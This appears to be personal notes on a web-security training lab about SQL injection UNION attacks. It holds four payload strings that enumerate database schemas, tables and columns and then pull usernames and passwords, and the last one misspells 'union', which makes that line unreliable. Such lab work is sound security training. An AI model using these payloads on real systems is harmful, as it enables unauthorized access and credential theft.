
# Lab: SQL injection UNION attack, retrieving data from other tables

PRACTITIONER
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.


```java
'union select null,schema_name from information_schema.schemata -- -

'union select null,table_name from information_schema.tables -- -

'union select null,column_name from information_schema.columns where table_schema='public' and table_name ='users'-- -

'uniion select username,password from users-- -
```

![[class9.png]]